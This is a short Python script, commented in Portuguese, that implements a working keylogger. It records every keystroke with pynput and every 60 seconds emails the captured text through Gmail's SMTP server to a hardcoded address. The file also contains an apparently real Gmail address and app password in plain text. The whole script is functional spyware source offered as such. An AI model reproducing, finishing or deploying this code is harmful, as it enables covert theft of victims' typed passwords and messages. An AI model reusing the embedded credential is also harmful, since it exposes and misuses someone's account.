from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer
# 🔥 Variável global obrigatória
log = ""

#CONFIGURAÇÕES DE E-MAIL
EMAIL_ORIGEM = "anacondafatality@gmail.com"
EMAIL_DESTINO= "anacondafatality@gmail.com"
SENHA_EMAIL = "qybt mvyt bnho nsiy"

def enviar_email():
    global log
    
    if log:      
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar:", e)

        # limpa o log só após enviar
        log = ""

    # Agendar envio a cada 60 segundos
    Timer(60, enviar_email).start()


def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<BACKSPACE>]"
        else:
            pass
 # Ignorar control, shift, etc......
#Inicia o Keylogger e o envio automático

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()


